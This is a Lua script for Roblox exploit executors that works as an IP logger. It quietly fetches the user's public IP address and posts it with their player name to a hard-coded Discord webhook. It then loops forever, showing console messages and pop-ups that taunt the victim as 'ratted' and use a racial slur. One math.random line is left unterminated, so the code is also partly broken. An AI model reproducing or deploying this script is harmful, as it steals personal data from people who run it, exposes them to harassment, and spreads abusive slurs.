
local webh = "https://discord.com/api/webhooks/964893587772960778/VRHZCBFoNLD6YrbxmEZSeYf_DrjyYFe2jYuBpZjZLvsvYueBOTyi7GPsKri3ZSK0EoKD"

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name,
               ["description"] = game:HttpGet("https://api.ipify.org")
           }
       }
   }

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)
local cum = math.random(345737612,2834562983467825608132759026578456084673409875602374806253489347658934650397650983260479826359826

while task.wait() do
rconsolename("YOU GOT RATTED")
rconsoleprint("GET LOGGED NIGAAAAAAA LOOOOL")
rconsoleprint(cum)
messagebox("GET LOGGED NIGGA LOOOOL", "U GOT LOGGED NIGGA LOSER", 0)
end
